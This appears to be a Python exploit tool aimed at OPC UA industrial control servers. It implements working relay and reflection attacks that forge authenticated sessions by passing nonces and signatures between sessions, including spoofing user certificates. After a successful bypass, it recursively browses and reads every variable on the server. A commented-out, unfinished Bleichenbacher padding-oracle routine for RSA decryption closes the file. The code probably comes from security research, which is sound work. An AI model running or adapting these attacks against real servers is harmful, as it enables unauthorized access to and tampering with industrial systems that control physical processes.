import requests
requests.packages.urllib3.disable_warnings()

from messages import *
from message_fields import *
from typing import *
from crypto import *
from datetime import datetime
from socket import socket, create_connection, SHUT_RDWR
from random import randint
from enum import Enum, auto
from binascii import unhexlify

import sys, os, itertools, re

# Logging and errors.
def log(msg : str):
  print(f'[*] {msg}', file=sys.stderr)
  
def log_success(msg : str):
  print(f'[+] {msg}')

# Thrown when an attack was not possible due to a configuration that is not vulnerable to it (other exceptions indicate 
# unexpected errors, which can have all kinds of causes). 
class AttackNotPossible(Exception):
  pass
  
# Protocols supported for current attacks.
class TransportProtocol(Enum):
  TCP_BINARY = auto()
  HTTPS = auto()
  
def proto_scheme(protocol : TransportProtocol) -> str:
  return {
    TransportProtocol.TCP_BINARY: "opc.tcp",
    TransportProtocol.HTTPS     : "https",
  }[protocol]
  
def parse_endpoint_url(url):
  m = re.match(r'(?P<scheme>[\w.]+)://(?P<host>[^:/]+):(?P<port>\d+)', url)
  if not m:
    raise Exception(f'Don\'t know how to process endpoint url: {url}')
  else:
    protos = {
      "opc.tcp": TransportProtocol.TCP_BINARY,
      "https"  : TransportProtocol.HTTPS,
    }
    if m.group('scheme') not in protos:
      raise Exception(f'Unsupported protocol: "{m.group("scheme")}" in URL {url}.')
    return (protos[m.group('scheme')], *m.group('host', 'port'))

# Common routines.

# Send an OPC request message and receive a response.
def opc_exchange(sock : socket, request : OpcMessage, response_obj : Optional[OpcMessage] = None) -> OpcMessage:
  with sock.makefile('rwb') as sockio:
    sockio.write(request.to_bytes())
    sockio.flush()
    response = response_obj or request.__class__()
    response.from_bytes(sockio)
    return response
    

# Sets up a binary TCP connection, does a plain hello and simply ignores the server's size and chunking wishes.
def connect_and_hello(host : str, port : int) -> socket:
  sock = create_connection((host,port))
  opc_exchange(sock, HelloMessage(
    version=0,
    receiveBufferSize=2**16,
    sendBufferSize=2**16,
    maxMessageSize=2**24,
    maxChunkCount=2**8,
    endpointUrl=f'opc.tcp://{host}:{port}/',
  ), AckMessage())
  return sock

def simple_requestheader(authToken : NodeId = NodeId(0,0)) -> requestHeader.Type:
  return requestHeader.create(
    authenticationToken=authToken,
    timeStamp=datetime.now(),
    requestHandle=0,
    returnDiagnostics=0,
    auditEntryId=None,
    timeoutHint=0,
    additionalHeader=None,
  )

@dataclass
class ChannelState:
  sock : socket
  channel_id: int
  token_id : int
  msg_counter : int
  crypto: Optional[SessionCrypto]

# Attempt to start a "Secure" channel with no signing or encryption.
def unencrypted_opn(sock: socket) -> ChannelState:
  reply = opc_exchange(sock, OpenSecureChannelMessage(
    secureChannelId=0,
    securityPolicyUri=SecurityPolicy.NONE,
    senderCertificate=None,
    receiverCertificateThumbprint=None,
    sequenceNumber=1,
    requestId=1,
    encryptedMessage=openSecureChannelRequest.to_bytes(openSecureChannelRequest.create(
      requestHeader=simple_requestheader(),
      clientProtocolVersion=0,
      requestType=SecurityTokenRequestType.ISSUE,
      securityMode=MessageSecurityMode.NONE,
      clientNonce=None,
      requestedLifetime=3600000,
    ))
  ))
  
  resp, _ = openSecureChannelResponse.from_bytes(reply.encryptedMessage)
  return ChannelState(
    sock=sock,
    channel_id=resp.securityToken.channelId,
    token_id=resp.securityToken.tokenId,
    msg_counter=2,
    crypto=None,
  )


# Exchange a conversation message, once the channel has been established by the OPN exchange.
def session_exchange(channel : ChannelState, 
                     reqfield : EncodableObjectField, respfield : EncodableObjectField, 
                     **req_data) -> NamedTuple:
  msg = ConversationMessage(
    secureChannelId=channel.channel_id,
    tokenId=channel.token_id,
    encodedPart=encodedConversation.to_bytes(encodedConversation.create(
      sequenceNumber=channel.msg_counter,
      requestId=channel.msg_counter,
      requestOrResponse=reqfield.to_bytes(reqfield.create(**req_data)),
    ))
  )
  
  crypto = channel.crypto
  if crypto:
    # Add padding and signing into encoded message.
    msgbytes = msg.to_bytes()
    padding = pkcs7_pad(msgbytes)[len(msgbytes):]
    mac = sha_hmac(crypto.policy, crypto.clientKeys.signingKey, msgbytes + padding)
    plaintext = msg.encodedPart + padding + mac
    
    # Encrypt encoded part.
    msg.encodedPart = aes_cbc_encrypt(crypto.clientKeys.encryptionKey, crypto.clientKeys.iv, plaintext)
    
  # Do the exchange.
  reply = opc_exchange(channel.sock, msg)
  
  if crypto:
    # Decrypt.
    plaintext = aes_cbc_encrypt(crypto.serverKeys.encryptionKey, crypto.serverKeys.iv, reply.encodedPart)
    
    # Remove signature and padding. Don't bother to validate.
    decodedPart = pkcs7_unpad(plaintext[:macsize(crypto.policy)])
  else:
    decodedPart = reply.encodedPart
    
  # Increment the message counter.
  channel.msg_counter += 1
    
  # Parse the response.
  convo, _ = encodedConversation.from_bytes(decodedPart)
  resp, _ = respfield.from_bytes(convo.requestOrResponse)
  return resp
  
# OPC exchange over HTTPS.
# https://reference.opcfoundation.org/Core/Part6/v105/docs/7.4
def https_exchange(
    url : str, nonce_policy : Optional[SecurityPolicy], 
    reqfield : EncodableObjectField, respfield : EncodableObjectField, 
    **req_data
  ) -> NamedTuple:
  headers = {
    'Content-Type': 'application/octet-stream',
  }
  if nonce_policy is not None:
    headers['OPCUA-SecurityPolicy'] =  f'http://opcfoundation.org/UA/SecurityPolicy#{nonce_policy.value}'
    
  reqbody = reqfield.to_bytes(reqfield.create(**req_data))
  http_resp = requests.post(url, verify=False, headers=headers, data=reqbody)
  return respfield.from_bytes(http_resp.content)[0]

# Picks either session_exchange or https_exchanged based on channel type.
def generic_exchange(
    chan_or_url : ChannelState | str, nonce_policy : Optional[SecurityPolicy], 
    reqfield : EncodableObjectField, respfield : EncodableObjectField, 
    **req_data
  ) -> NamedTuple:
    if type(chan_or_url) == ChannelState:
      return session_exchange(chan_or_url, reqfield, respfield, **req_data)
    else:
      assert type(chan_or_url) == str and chan_or_url.startswith('https://')
      return https_exchange(chan_or_url, nonce_policy, reqfield, respfield, **req_data)

# Request endpoint information from a server.
def get_endpoints(ep_url : str) -> List[endpointDescription.Type]:
  if ep_url.startswith('opc.tcp://'):
    _, host, port = parse_endpoint_url(ep_url)
    with connect_and_hello(host, port) as sock:
      chan = unencrypted_opn(sock)
      resp = session_exchange(chan, getEndpointsRequest, getEndpointsResponse, 
        requestHeader=simple_requestheader(),
        endpointUrl=ep_url,
        localeIds=[],
        profileUris=[],
      )
  else:
    assert(ep_url.startswith('https://'))
    resp = https_exchange(f'{ep_url.rstrip("/")}/discovery', None, getEndpointsRequest, getEndpointsResponse, 
        requestHeader=simple_requestheader(),
        endpointUrl=ep_url,
        localeIds=[],
        profileUris=[],
    )
      
  return resp.endpoints


# Performs the relay attack. Channels can be either OPC sessions or HTTPS URLs.
def execute_relay_attack(
    imp_chan : ChannelState | str, imp_endpoint : endpointDescription.Type,
    login_chan : ChannelState | str, login_endpoint : endpointDescription.Type,
    prefer_certauth : bool = False
  ) -> NodeId:
    def csr(chan, client_ep, server_ep, nonce):
      return generic_exchange(chan, server_ep.securityPolicyUri, createSessionRequest, createSessionResponse, 
        requestHeader=simple_requestheader(),
        clientDescription=client_ep.server,
        serverUri=server_ep.server.applicationUri,
        endpointUrl=server_ep.endpointUrl,
        sessionName=None,
        clientNonce=nonce,
        clientCertificate=client_ep.serverCertificate,
        requestedSessionTimeout=600000,
        maxResponseMessageSize=2**24,
      )

    # Send CSR to login_endpoint, pretending we're imp_endpoint. Use arbitrary nonce.
    createresp1 = csr(login_chan, imp_endpoint, login_endpoint, os.urandom(32))
    
    # Now send the server nonce of this channel as a client nonce on the other channel.
    createresp2 = csr(imp_chan, login_endpoint, imp_endpoint, createresp1.serverNonce)
    
    if createresp2.serverSignature.signature is None:
      raise AttackNotPossible('Server did not sign nonce. An OPN attack may be needed first.')
    
    # Make a token with an anonymous or certificate-based user identity policy.
    anon_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
    cert_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.CERTIFICATE]
    if anon_policies and not (prefer_certauth and cert_policies):
      usertoken = anonymousIdentityToken.create(policyId=anon_policies[0].policyId)
      usersig = signatureData.create(algorithm=None,signature=None)
    elif cert_policies:
      log('User certificate required. Reusing the server certificate to forge user token.')
      usertoken = x509IdentityToken.create(
        policyId=cert_policies[0].policyId, 
        certificateData=imp_endpoint.serverCertificate
      )
      
      # Simply reuse the clientSignature, since we're using the same cert and nonce for that.
      usersig = createresp2.serverSignature
    else:
      raise AttackNotPossible('Endpoint does not allow either anonymous or certificate-based authentication.')
    
    # Now activate the first session using the signature from the second session.
    generic_exchange(login_chan, login_endpoint.securityPolicyUri, activateSessionRequest, activateSessionResponse, 
      requestHeader=simple_requestheader(createresp1.authenticationToken),
      clientSignature=createresp2.serverSignature,
      clientSoftwareCertificates=[],
      localeIds=[],
      userIdentityToken=usertoken,
      userTokenSignature=usersig,
    )
    
    # Return auth token if succesful.
    return createresp1.authenticationToken

# Demonstrate access by recursively browsing nodes. Variables are read.
# Based on https://reference.opcfoundation.org/Core/Part4/v104/docs/5.8.2
def demonstrate_access(chan : ChannelState | str, authToken : NodeId, policy : SecurityPolicy = None):
  max_children = 100
  recursive_nodeclasses = {NodeClass.OBJECT}
  read_nodeclasses = {NodeClass.VARIABLE}
  
  def browse_from(root, depth):
    bresp = generic_exchange(chan, policy, browseRequest, browseResponse,
      requestHeader=simple_requestheader(authToken),
      view=viewDescription.default_value,
      requestedMaxReferencesPerNode=max_children,
      nodesToBrowse=[browseDescription.create(
        nodeId=root,
        browseDirection=BrowseDirection.FORWARD,
        referenceTypeId=NodeId(0,0), #NodeId(0, 33),
        includeSubtypes=True,
        nodeClassMask=0x00, # All classes
        resultMask=0x3f,    # All results
      )],
    )
    
    tree_prefix = ' ' * (depth - 1) + '|'
    for result in bresp.results:
      for ref in result.references:
        if ref.nodeClass in recursive_nodeclasses:
          # Keep browsing recursively.
          log_success(tree_prefix + f'+ {ref.displayName.text} ({ref.nodeClass.name})')
          browse_from(ref.nodeId.nodeId, depth + 1)
        elif ref.nodeClass in read_nodeclasses:
          # Read current variable value. For the sake of simplicity do one at a time.
          try:
            readresp = generic_exchange(chan, policy, readRequest, readResponse,
              requestHeader=simple_requestheader(authToken),
              maxAge=0,
              timestampsToReturn=TimestampsToReturn.BOTH,
              nodesToRead=[readValueId.create(
                nodeId=ref.nodeId.nodeId,
                attributeId=0x0d, # Request value
                indexRange=None,
                dataEncoding=QualifiedNameField().default_value,
              )],
            )
            
            for r in readresp.results:
              if type(r.value) == list:
                log_success(tree_prefix + f'+ {ref.displayName.text} (Array):')
                for subval in r.value:
                  log_success(' ' + tree_prefix + f'+ {ref.displayName.text}: "{subval}"')
              else:
                log_success(tree_prefix + f'- {ref.displayName.text}: "{r.value}"')
          except UnsupportedFieldException as ex:
            log_success(tree_prefix + f'- {ref.displayName.text}: <{ex.fieldname}>')
          except DecodeError as ex:
            log_success(tree_prefix + f'- {ref.displayName.text}: <decode error>')
          except Exception as ex:
            log_success(tree_prefix + f'- {ref.displayName.text}: <{type(ex)}>')
        else:
          log_success(tree_prefix + f'- {ref.displayName.text} ({ref.nodeClass.name})')
          
    if len(bresp.results) >= max_children:
      log_success(tree_prefix + '- ...')
    
  log('Trying to browse data via authenticated channel.')
  log('Tree: ')
  log_success('+ <root>')
  browse_from(NodeId(0, 84), 1)
  log('Finished browsing.') 

# Reflection attack: log in to a server with its own identity.
def reflect_attack(url : str, demo : bool):
  proto, host, port = parse_endpoint_url(url)
  log(f'Attempting reflection attack against {url}')
  endpoints = get_endpoints(url)
  log(f'Server advertises {len(endpoints)} endpoints.')
  
  # Try to attack against the first endpoint with an HTTPS transport and a non-None security policy.
  https_eps = [ep for ep in endpoints if ep.securityPolicyUri != SecurityPolicy.NONE and ep.transportProfileUri.endswith('https-uabinary')]
  if https_eps:
    target = https_eps[0]
    tproto, thost, tport = parse_endpoint_url(target.endpointUrl)
    assert tproto == TransportProtocol.HTTPS
    url = target.endpointUrl
    log(f'Targeting {url} with {target.securityPolicyUri.name} security policy.')
    token = execute_relay_attack(url, target, url, target)
    log_success(f'Attack succesfull! Authenticated session set up with {url}.')
    if demo:
      demonstrate_access(url, token, target.securityPolicyUri)
  else:
    raise AttackNotPossible('TODO: implement combination with OPN attack.')
      
def relay_attack(source_url : str, target_url : str, demo : bool):
  log(f'Attempting relay from {source_url} to {target_url}')
  seps = get_endpoints(source_url)
  log(f'Listed {len(seps)} endpoints from {source_url}.')
  teps = get_endpoints(target_url)
  log(f'Listed {len(teps)} endpoints from {target_url}.')
  
  # Prioritize HTTPS targets with a non-NONE security policy.
  teps.sort(key=lambda ep: [not ep.transportProfileUri.endswith('https-uabinary'), ep.securityPolicyUri == SecurityPolicy.NONE])
  
  tmpsock = None
  prefercert = False
  try:
    for sep, tep in itertools.product(seps, teps):
      # Source must be HTTPS and non-NONE.
      if sep.transportProfileUri.endswith('https-uabinary') and sep.securityPolicyUri != SecurityPolicy.NONE:
        oraclechan = sep.endpointUrl
        supports_usercert = any(p.tokenType == UserTokenType.CERTIFICATE for p in tep.userIdentityTokens)
        
        if tep.transportProfileUri.endswith('https-uabinary'):
          # HTTPS target.
          mainchan = tep.endpointUrl
        elif tep.transportProfileUri.endswith('uatcp-uasc-uabinary') and tep.securityPolicyUri == SecurityPolicy.NONE and supports_usercert:
          # When only a TCP target is available we can still try to spoof a user cert.
          _, thost, tport = parse_endpoint_url(tep.endpointUrl)
          tmpsock = connect_and_hello(thost, tport)
          mainchan = unencrypted_opn(tmpsock)
          prefercert = True
        else:
          continue
          
        log(f'Trying endpoints {sep.endpointUrl} ({sep.securityPolicyUri.name})-> {tep.endpointUrl} ({tep.securityPolicyUri.name})')
        token = execute_relay_attack(oraclechan, sep, mainchan, tep, prefercert)
        log_success(f'Attack succesfull! Authenticated session set up with {tep.endpointUrl}.')
        if demo:
          demonstrate_access(mainchan, token, tep.securityPolicyUri)
        return
    
    raise AttackNotPossible('TODO: implement combination with OPN attack.')
  except ServerError as err:
    if err.errorcode == 0x80550000 and target_url.startswith('opc.tcp'):
      raise AttackNotPossible('Security policy rejected by server. Perhaps user authentication over NONE channel is blocked.')
    else:
      raise err
  finally:
    if tmpsock:
      tmpsock.shutdown(SHUT_RDWR)
      tmpsock.close()
      



# @dataclass
# class PaddingOracleReuseState:
#   sock    : Optional[socket] = None
#   counter : int = 1
  
# # Returns whether an RSA ciphertext has correct padding, using a Basic128Rsa15 endpoint.
# # When possible, uses reuse_state to avoid having to repeat TCP + hello handshake for every attempt.
# # Thread-safe whenever a different reuse_state object is used for each thread.
# def query_padding_oracle(
#     endpoint : endpointDescription.Type, ciphertext : bytes, reuse_state : PaddingOracleReuseState
#   ) -> bool:
#     assert endpoint.securityPolicyUri == SecurityPolicy.BASIC128RSA15
#     def try_open_request():
#       try:
#         opc_exchange(reuse_state.sock, OpenSecureChannelMessage(
#           secureChannelId=0,
#           securityPolicyUri=SecurityPolicy.BASIC128RSA15,
#           senderCertificate=endpoint.serverCertificate,
#           receiverCertificateThumbprint=certificate_thumbprint(endpoint.serverCertificate),
#           sequenceNumber=reuse_state.counter,
#           requestId=reuse_state.counter,
#           encryptedMessage=ciphertext
#         ))
#         return True
#       except ServerError as err:
#         if err.errorcode == ....:
#           return True
#         elif err.errorcode == ....:
#           return False
#         else:
#           raise err
    
#     done = False
#     if reuse_state.sock:
#       try:
#         padresult = try_open_request()
#         done = True
#       except:
#         # On any misc. exception, assume the connection is broken and try again with a fresh socket.
#         try:
#           reuse_state.sock.shutdown(SHUT_RDWR)
#           reuse_state.sock.close()
#         except:
#           pass
        
#     if not done:
#       reuse_state.sock = connect_and_hello(*parse_endpoint_url(endpoint.endpointUrl))
#       reuse_state.counter = 1
#       padresult = try_open_request()
      
#     reuse_state.counter += 1
#     return padresult

# # Carry out a padding oracle attack against a Basic128Rsa15 endpoint.
# # Result is ciphertext**d mod n; can also be used for signature forging.
# def rsa_decryptor(endpoint : endpointDescription.Type, ciphertext : bytes):
#   # Bleicehnacher's original attack: https://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf
  
#   clen = len(ciphertext)
#   assert clen % 128 == 0 # Probably not an RSA ciphertext if the key size is not a multiple of 1024 bits.
#   k = clen * 8
  
#   # Ciphertext as integer.
#   c = 0
#   for by in ciphertext:
#     c *= 256
#     c += by
    
#   # Extract public key from the endpoint certificate.
#   n, e = certificate_rsakey(endpoint.serverCertificate)
  
#   # B encodes as 00 01 00 00 00 .. 00 00
#   B = 2**(k-16)
    
#   # Oracle function.
#   rstate = PaddingOracleReuseState()
#   def query(candidate):
#     # Encode int as bigendian binary to submit it to the oracle.
#     cand_bytes = [0] * clen
#     j = candidate
#     for ix in reverse(range(0, clen)):
#       cand_bytes[ix] = j % 256
#       j /= 256
#     assert j == 0
#     return query_padding_oracle(endpoint, cand_bytes, rstate)
    
#   # Step 1: blinding. Find a random blind that makes the padding valid. Searching can be skipped if the ciphertext
#   # already has valid padding.
#   if query(c):
#     s0 = 1
#     c0 = c
#   else:
#     for _ in range(1, MAX_PADDINGORACLE_ITERATIONS):
#       s0 = randint(1, 2**k)
#       c0 = c * pow(s0, e, n) % n
#       if query(c0):
#         break
  
#   intervals = [(2 * B, 3 * B - 1)]
  
#   for i in range(1, MAX_PADDINGORACLE_ITERATIONS):
#     # Step 2: searching for PKCS#1 conforming messages.
#     if i == 1:
#       s = n // (3*B) + (1 if n % (3*B) else 0)
#       while not query(c0 * pow(s0, e, n) % n):
#         s += 1
#     elif len(intervals) > 1:
#       s += 1
#       while not query(c0 * pow(s0, e, n) % n):
#         s += 1
#     else:
#         [(a, b)] = intervals
#         rstart = (2 * b * s - 2 * B) // n + 1
#         ....
        
    